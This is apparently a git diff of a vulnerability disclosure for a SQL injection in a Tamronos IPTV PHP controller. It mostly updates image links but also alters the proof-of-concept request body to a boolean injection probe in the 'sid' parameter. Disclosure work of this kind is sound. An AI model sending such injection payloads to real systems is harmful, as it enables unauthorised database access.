@@ -8,7 +8,7 @@ official website：http://www.tamronos.com/
 ## Vulnerability Details
 
 The `update_server_status()` method in the `iptv/Controllers/ApkapiController.php` file was directly passed into the `updateserver()` method without filtering the `$ip`, `$sid`, and `$netstream` parameters passed in by the user, resulting in SQL injection.
-![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/ae4e9386-0ca1-4da5-aa34-40bd6473f781)
+![update_server_status](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/update_server_status.jpg)
 
 
 
@@ -26,7 +26,7 @@ updateserver() Code:
         $this->query($sql);
 	}
 ```
-![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/718016c0-0d0e-441b-ba32-c3661513066d)
+![updateserver](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/updateserver.jpg)
 
 
 ## Recurrence vulnerability
@@ -52,6 +52,6 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 16
 
-ip=1&sid=1 and 1
+ip=1&sid=1 and 1=2
 ```
-![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/86b53221-f1c1-4eb4-94f7-1e435745857e)
+![testok2](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/testok2.jpg)
